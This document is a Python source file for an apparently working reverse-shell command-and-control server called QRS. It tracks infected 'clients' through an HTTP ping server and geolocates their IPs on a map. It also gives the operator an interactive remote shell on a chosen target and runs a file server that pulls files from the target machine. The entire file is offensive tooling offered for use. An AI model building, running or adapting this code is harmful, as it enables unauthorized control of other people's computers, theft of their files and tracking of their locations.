import socket
import time
import tqdm
import os
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import tabulate
import random
import requests
from urllib.request import urlopen
import folium
import webbrowser
import re as r
from colorama import init, Fore, Back, Style

SEPARATOR = "<sep>"  # For separating filename and filesize

client_id = 0
clients = []
connect = False
cwd = ""

# HTTP Server for Ping
class SimpleHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Override log_message to suppress default logging
        return  # Do nothing or implement custom logging if needed
    log_message(None, None, None)
    def do_GET(self):
        global clients, client_id, connect
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        client_address = self.client_address

        found = False
        for client in clients:
            if client.client_address[0] == client_address[0]:
                client.last_active_time = time.time()
                client.status = "ACTIVE"
                found = True
                if connect:
                    response = "connect"
                    connect = False
                else:
                    response = "notted"
                break
        if not found:
            clients.append(Client(None, client_address, client_id))
            client_id += 1
            print(f"\n{client_address[0]}:{client_address[1]} Connected!")

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        try:
            
            self.wfile.write(response.encode())
        except Exception as e:
            self.wfile.write("notted".encode())


# Start HTTP Server in Background
def start_http_server():
    global httpd
    httpd = HTTPServer(('0.0.0.0', 5000), SimpleHandler)
    print(f"\nPing server started on 0.0.0.0:5000")
    httpd.serve_forever()
def stop_http_server():
    global httpd
    if httpd:
        httpd.shutdown()
        httpd = None
        print("[*] Stopped http-ping server")

# Client Class
class Client:
    def __init__(self, client_socket, client_address, client_id=0):
        self.client_socket = client_socket
        self.client_address = client_address
        self.client_id = client_id
        self.connection_time = time.time()
        self.last_active_time = self.connection_time
        self.status = "ACTIVE"

    def get_connection_duration(self):
        return time.time() - self.connection_time

    def get_last_connection_duration(self):
        return time.time() - self.last_active_time

    def GetStatus(self):
        if self.get_last_connection_duration() < 6:
            return "ACTIVE"
        else:
            return "INACTIVE"

    def __str__(self):
        Active = self.GetStatus()
        self.status = Active
        connection_duration = self.get_connection_duration()
        last_connection_duration = self.get_last_connection_duration()
        connection_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.connection_time))
        if Active != "INACTIVE":
            return f"Client ID : {self.client_id} : ACTIVE for {connection_duration:.2f} sec [Address: {self.client_address}, Connected at: {connection_time_str} ({FormatTime(connection_duration)} ago)]"
        else:
            return f"Client ID : {self.client_id} : INACTIVE for {last_connection_duration:.2f} sec [Address: {self.client_address}, Connected at: {connection_time_str} ({FormatTime(last_connection_duration)} ago), last active at: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.last_active_time))} ({FormatTime(connection_duration - last_connection_duration)} ago)]"


# Mapping
def MapConnections(connections):
    map_object = folium.Map(location=[20, 0], zoom_start=2, tiles="CartoDB dark_matter")

    for connection in connections:
        ip = connection.client_address[0]
        if ip != "127.0.0.1" and ip != "0.0.0.0":
            pass
        else:
            ip = str(getIP())

        try:
            response = requests.get(f'https://ipwho.is/{ip}', timeout=5)
            data = response.json()
            if not data.get("success"):
                print(f"[!] Failed to locate IP: {ip}")
                continue
            else:
                print(f"[+] IP: {ip} - City: {data["city"]}")


            lat = data["latitude"]
            lon = data["longitude"]
            city = data.get("city", "Unknown")
            country = data.get("country", "")
            status = connection.GetStatus()

            popup_html = f"""
                <b>Client ID:</b> {connection.client_id}<br>
                <b>Status:</b> {status}<br>
                <b>IP:</b> {ip}<br>
                <b>Location:</b> {city}, {country}
            """

            # Add a circle to represent the approximate city area
            folium.Circle(
                location=[lat, lon],
                radius=8000,  # ~8km radius
                color='darkred',
                fill=True,
                fill_opacity=0.25,
                popup=f"Approx. location: {city}"
            ).add_to(map_object)

            # Add the actual pin for the client
            folium.Marker(
                location=[lat, lon],
                popup=folium.Popup(popup_html, max_width=300),
                tooltip=f"Client {connection.client_id} ({status})",
                icon=folium.Icon(color="red" if status == "ACTIVE" else "red", icon="user")
            ).add_to(map_object)

        except Exception as e:
            print(f"[!] Error mapping IP {ip}: {e}")

    map_object.save("clients_map.html")
    print("[*] Map saved as clients_map.html")

init()

with open("WorldMap.txt", "r") as file:
    world_map = file.read()


def MapConnectionsCMD(map_data, connections):
    locations = []
    for connection in connections:
        ip = connection.client_address[0]
        if ip != "127.0.0.1" and ip != "0.0.0.0":
            pass
        else:
            ip = str(getIP())

        try:
            response = requests.get(f'https://ipwho.is/{ip}', timeout=5)
            data = response.json()
            if not data.get("success"):
                print(f"[!] Failed to locate IP: {ip}")
                continue
            else:
                print(f"[+] Client ID: {connection.client_id} - IP {ip} - City: {data["city"]}")
            locations.append((data["latitude"], data["longitude"], connection.client_id))
        except Exception as e:
            print(f"[!] Error fetching location for IP {ip}: {e}")
            continue
    # Create a grid to represent the map
    grid = [[' ' for _ in range(80)] for _ in range(24)]
    
    lines = map_data.splitlines()
    for y in range(min(24, len(lines))):  # Prevent too many lines
        line = lines[y]
        if y == len(lines) // 2:
            for x in range(len(line)):
                if x == len(line) //2:
                    grid[y][x] = '+'
                else:
                    grid[y][x] = '-'
        else:
            for x in range(min(80, len(line))):  # Prevent too wide lines
                if x == len(line) // 2:
                    grid[y][x] =  '|'
                else:
                    char = line[x]
                    grid[y][x] = Fore.GREEN + char


    # Mark the locations on the map
    for loc in locations:
        latitude, longitude, ClientID = loc
        x = int((longitude + 180) * (80 / 360))  # Longitude: -180 to +180 mapped to 0 to 80
        y = int((90 - latitude) * (24 / 180))    # Latitude: +90 (top) to -90 (bottom)
        print(f"Location: {loc}, {ClientID} -> Grid: ({x}, {y})")
        if 0 <= x < 80 and 0 <= y < 24:
            grid[y][x] = Fore.RED + f'{ClientID}'
        else:
            print(f"Location {loc} is out of bounds for the map.")

    # Print the map
    for row in grid:
        for char in row:
            print(''.join(char) + Style.RESET_ALL, end='')
        print("\n", end='')


# Formating
def TimeStamp():
    return f"[{time.strftime('%H:%M:%S', time.localtime())}]"
def FormatTime(seconds):
    if seconds/60 > 1:
        return time.strftime('%Mm, %Ss', time.gmtime(seconds))
    elif seconds/3600 > 1:
        return time.strftime('%Hh, %Mm, %Ss', time.gmtime(seconds))
    elif seconds/86400 > 1:
        return time.strftime('%Dd, %Hh, %Mm, %Ss', time.gmtime(seconds))
    else:
        return time.strftime('%Ss', time.gmtime(seconds))

# Server for File Download
def StartServer(host='127.0.0.1', port=5005, output_folder='received_files'):
    global server_running
    server_running = True
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[*] Listening on {host}:{port}...")

    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    while server_running:
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection from {client_address} has been established.")

        try:
            buffer = ""
            while SEPARATOR not in buffer:
                buffer += client_socket.recv(1024).decode('utf-8')

            filename, filesize_data = buffer.split(SEPARATOR, 1)
            if not filename or not filesize_data.isdigit():
                raise ValueError(f"Invalid filename or filesize received: '{buffer}'")
            print(f"[+] File server caught {filename}, size: {filesize_data} bytes")
            filesize = int(filesize_data)
            output_path = os.path.join(output_folder, filename)

            client_socket.send("READY".encode('utf-8'))

            with open(output_path, 'wb') as f:
                bytes_received = 0
                progress = tqdm.tqdm(total=filesize, desc=f"Downloading {filename}", unit="B", unit_scale=True,
                                     unit_divisor=1024)
                while bytes_received < filesize:
                    data = client_socket.recv(min(filesize - bytes_received, 1024))
                    if not data:
                        break
                    f.write(data)
                    bytes_received += len(data)
                    progress.update(len(data))
                progress.close()

            print(f"[+] Downloaded {filename} to {output_path}")

        except ValueError as e:
            print(f"[!] Error: {e}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
        finally:
            client_socket.close()


# Support
def start_file_server_in_thread():
    global file_server
    server_thread = threading.Thread(target=StartServer, args=(SERVER_HOST, 5005), daemon=True)
    server_thread.start()
    print(f"{TimeStamp()} File Server is active on {SERVER_HOST}:5005")
def stop_file_server():
    global server_running
    server_running = False
    print("[*] Stopping file-server...")
def getIP():
    d = str(urlopen('http://checkip.dyndns.com/').read())

    return r.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)

def __str__(clients):
    if len(clients) == 0:
        print(f"{TimeStamp()} No connections found.")
    else:
        print(f"{TimeStamp()} Found {len(clients)} connection(s):")
        table = []
        for client in clients:
            connection_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(client.connection_time))
            if client.GetStatus() == "ACTIVE":
                table.append([client.client_id, client.client_address[0], client.client_address[1], client.GetStatus(), f"{connection_time_str} ({FormatTime(client.get_connection_duration())} ago)", "N/A"])
            else:
                table.append([client.client_id, client.client_address[0], client.client_address[1], client.GetStatus(), f"{connection_time_str} ({FormatTime(client.get_connection_duration())} ago)", f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(client.last_active_time))} ({FormatTime(client.get_connection_duration() - client.get_last_connection_duration())} ago)"])
        print(f"\n{tabulate.tabulate(table, headers=["Client ID", "IP Address", "Port", "Status", "Connected At", "Last active at"], tablefmt="presto")}\n")


def RemoveInactiveClients():
    global clients
    s = 0
    for client in clients:
        if client.GetStatus() == "INACTIVE":
            print(f"[*] Removing inactive client {client.client_id} from the list.")
            clients.remove(client)
            s += 1
    print(f"\n{TimeStamp()} Removed {s} inactive client(s) from the list.")

def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
    original_cwd = os.getcwd()
    os.chdir(repo_path)

    try:
        subprocess.run(['git', 'fetch'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

        local_commit = subprocess.check_output(
            ['git', 'rev-parse', branch],
            stderr=subprocess.DEVNULL
        ).strip()
        remote_commit = subprocess.check_output(
            ['git', 'rev-parse', f'origin/{branch}'],
            stderr=subprocess.DEVNULL
        ).strip()

        local_version = "unknown"
        if os.path.exists(version_file):
            with open(version_file) as f:
                local_version = f.read().strip()

        try:
            remote_version = subprocess.check_output(
                ['git', 'show', f'origin/{branch}:{version_file}'],
                stderr=subprocess.DEVNULL
            ).decode().strip()
        except subprocess.CalledProcessError:
            remote_version = "unknown"

        if local_commit != remote_commit:
            commit_msg = subprocess.check_output(
                ['git', 'log', '-1', '--pretty=%s', f'origin/{branch}'],
                stderr=subprocess.DEVNULL
            ).decode().strip()

            print(f"[!] Update available {local_version} > {remote_version}: {commit_msg}")
        else:
            print(f"[✓] You're up to date. Version: {local_version}")

    except subprocess.CalledProcessError as e:
        print(f"[X] Git error: {e}")
    finally:
        os.chdir(original_cwd)



def StopServices():
    print(f"\n[*] Stopping services...")
    stop_http_server()
    stop_file_server()
    print(f"{TimeStamp()} services stopped.")

# Command handling system
commands = {}
def parse_args(cmdName, arg_spec, raw_args):
    parsed = []
    for i, arg in enumerate(arg_spec):
        if len(arg) == 3:
            name, type_, optional = arg
        else:
            name, type_ = arg
            optional = False

        if i >= len(raw_args):
            if optional:
                parsed.append(None)
                continue
            else:
                raise ValueError(f"Missing argument: {cmd_name} <{name}({type_.__name__})>")

        try:
            parsed.append(type_(raw_args[i]))
        except ValueError:
            raise ValueError(f"Invalid value for {name}: expected {type_.__name__}")
    return parsed


def command(name, arg_spec=None, description=""):
    def wrapper(func):
        commands[name] = {
            "func": func,
            "args": arg_spec or [],
            "description": description,
        }
        return func
    return wrapper

def find_command(parts):
    for length in range(len(parts), 0, -1):
        cmd_name = " ".join(parts[:length]).lower()
        if cmd_name in commands:
            return cmd_name, parts[length:]
    return None, parts


@command("quit", description="Quit the program")
def cmd_quit():
    exit(0)
@command("connections", description="Show all active connections")
def cmd_connections():
    __str__(clients)
@command("clear", description="Clears the Terminal screen")
def cmd_clear():
    os.system("cls" if os.name == "nt" else "clear")
@command("clear inactive", description="Clear inactive connections")
def cmd_clear_inactive():
    RemoveInactiveClients()
@command("clear connections", description="Clear all connections")
def cmd_clear_connections():
    global clients
    clearedConnections = len(clients)
    clients.clear()
    print(f"{TimeStamp()} {clearedConnections} Connection(s) cleared.")
@command("download", arg_spec=[("filename", str)], description="Download a file from the target machine")
def cmd_download(filename):
    global clients
    if len(clients) == 0:
        print(f"{TimeStamp()} No connections found.")
        return
    client = clients[0]
    if client.GetStatus() == "INACTIVE":
        print(f"Client {client.client_id} is inactive. Removing from the list.")
        clients.pop(0)
        return

    print(f"{TimeStamp()} Downloading {filename} from {client.client_address[0]}:{client.client_address[1]}...")
    client.client_socket.send(f"download{SEPARATOR}{filename}".encode())
    response = client.client_socket.recv(BUFFER_SIZE).decode()
    if response == "READY":
        print(f"{TimeStamp()} File server is ready to receive the file.")
    else:
        print(f"[!] Error: {response}")
@command("help", description="Show this help message")
def cmd_help():
    print("Commands:")
    for name, info in commands.items():
        arg_list = " ".join(
            f"<{n}({t.__name__})>" 
            for arg in info["args"]
            for n, t in [arg[:2]]
        )        
        print(f"  {name} {arg_list} — {info['description']}")
@command("update", description="Update QRS to the latest version")
def cmd_update():
    print(f"{TimeStamp()} Updating QRS...")
    try:
        subprocess.run("git pull https://github.com/the-real-N0NAME/QRS.git", shell=True, check=True)
        print(f"{TimeStamp()} QRS updated successfully. Restarting...")
        StopServices()
        print(f"{TimeStamp()} Restarting QRS in 3 sec...")
        time.sleep(3)
        os.system("cls" if os.name == "nt" else "clear")
        subprocess.run("python QRS.py", shell=True, check=True)
        exit(0)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error occurred while updating QRS: {e.stderr}")

@command("map connections", arg_spec=[("cmd", str, True)], description="Map connections on a world map")
def cmd_map_connections(cmd):
    if cmd == "-cmd":
        print(f"{TimeStamp()} Mapping connections in command line...")
        MapConnectionsCMD(world_map, clients)
    else:
        print(f"{TimeStamp()} Mapping connections...")
        MapConnections(clients)
        try:
            webbrowser.open('clients_map.html')
            print("[*] Map opened in web browser.")
        except FileNotFoundError:
            print("[!] Map file not found.")

@command("type", description="Show the buffer size")
def cmd_type():
    print(f"[*] The Buffer size is currently set to {BUFFER_SIZE/1000000} MB. If you want to see larger files use the 'download' command.")

@command("start file server", description="Start a file server to receive files from the target machine")
def cmd_start_file_server():
        start_file_server_in_thread()
        print(f"{TimeStamp()} File server started on {SERVER_HOST}:5005")


@command("connect", arg_spec=[("client_id", int)], description="Connect to a specific client")
def cmd_connect(client_id):
    global clients, connect
    if client_id >= len(clients) or client_id < 0:
        print("Invalid client ID.")
        return
    
    client = clients[client_id]
    if client.GetStatus() == "INACTIVE":
        print(f"Client {client_id} is inactive. Removing from the list.")
        clients.pop(client_id)
        return

    print(f"{TimeStamp()} Connecting to {client.client_address[0]}:{client.client_address[1]}...")
    connect = True

    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    print(f"{TimeStamp()} Waiting for client({client.client_address[0]}) connection on {SERVER_HOST}:{SERVER_PORT} ...")
    s.listen(5)
    s.settimeout(5)
    while True:
        try:
            client_socket, client_address = s.accept()
            print(f"{TimeStamp()} {client_address[0]}:{client_address[1]} Connection established!")

            cwd = client_socket.recv(BUFFER_SIZE).decode()
            while True:
                local_cmd_input = input(f"{cwd} $> ")
                if not local_cmd_input.strip():
                    continue
                local_parts = local_cmd_input.split()
                local_cmd_name, local_raw_args = find_command(local_parts)
                try:
                    local_cmd = commands[local_cmd_name]
                    parsed_args = parse_args(local_cmd_name, local_cmd["args"], local_raw_args)
                    local_cmd["func"](*parsed_args)
                except KeyError:
                    pass
                except Exception as e:
                    print(f"[!] There was an error while finding or executing a shell command: {e}")

                client_socket.send(local_cmd_input.encode())
                output = client_socket.recv(BUFFER_SIZE).decode()
                
                # Send exit before exiting to ensure the client is also closed
                if local_cmd_input.lower() == "exit":
                    break
                try:
                    results, cwd = output.split(SEPARATOR)
                except ValueError as e:
                    if "not enough values to unpack" in str(e):
                        results = f"[E] The output received from the client is most likely to long use '-f' flag at the end of the command to save the output to a file, {e}"
                except Exception as e:
                    results = f"[!] Error occurred while receiving data: {e}"
                print(results)
            break
        except socket.timeout:
            print(f"[!] Connection timed out. There was en error on the client side.")
            break
        except Exception as e:
            print(f"[!] Server side Error occurred: {e}")
            break

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 5 * 1024 * 1024  # 5MB for ouput buffer size, feel free to increase

# Start HTTP Server in the Background
http_server_thread = threading.Thread(target=start_http_server, daemon=True)
http_server_thread.start()

# Banner
banners = os.listdir("./banners")
if len(banners) > 0:
    with open(f"./banners/{random.choice(banners)}", "r", encoding="utf-8") as f:
        print(f.read())
else:
    print("[!] Failed to load banner.")


# Welcome Message
print(f"QRS Started on {SERVER_HOST}:{SERVER_PORT} at {TimeStamp()}")
print(f"Welcome to QRS a Python-based reverse shell!")
print("Type 'help' to see the available commands.")
print("--------------------------------------------------")
CheckForUpdates()
print("\n")
while True:
    cmd_input = input(f"{TimeStamp()} $> ").strip().lower()
    if not cmd_input:
        continue
    parts = cmd_input.split()
    cmd_name, raw_args = find_command(parts)

    if cmd_name is None:
        print(f"Unknown command: {parts[0]}")
        continue

    cmd = commands[cmd_name]
    try:
        parsed_args = parse_args(cmd_name, cmd["args"], raw_args)
        cmd["func"](*parsed_args)
    except ValueError as e:
        print("Error:", e)